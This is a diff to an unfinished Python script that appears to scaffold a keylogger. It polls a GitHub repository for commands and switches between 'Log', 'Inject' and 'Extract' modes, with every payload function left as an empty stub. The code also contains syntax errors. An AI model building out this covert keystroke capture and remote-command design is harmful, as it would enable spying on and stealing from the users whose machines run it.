@@ -43,7 +43,6 @@ def setup_communication_with_github_repo() -> GitHubRepo:
 
     print("Committed:", result["commit"]["sha"])
     return repo
-    pass
 
 # def recieve_mode_from_git_repo()
 #     pass
@@ -71,7 +70,34 @@ if __name__ == "__main__":
         print("FAILED to detect operating system detected", file=sys.sterr)
 
     # Set up connection with GitHub repo to recieve and extract commands:
-    setup_communication_with_github_repo()
+    repo = setup_communication_with_github_repo()
+
+    # What mode are we in ? Log -> L, Inject -> I , Extract -> E (Default mode is Log):
+    mode = "L"
+    can_communicate_to_github = False
+    # Set the check for connection to GitHub:
+    while True:
+        can_communicate_to_github = True if repo.can_reach_github() else False
+
+        if mode == "L":
+            # Call key loggin function:
+            pass
+        else if mode == "I":
+            # Call key Injection function:
+            pass
+        else if mode == "E":
+            # Call key Extraction function:
+            pass
+        else:
+            # Call key loggin function:
+            mode = "L"
+            pass
+
+
+
+
+        pass
+
 
     pass
 
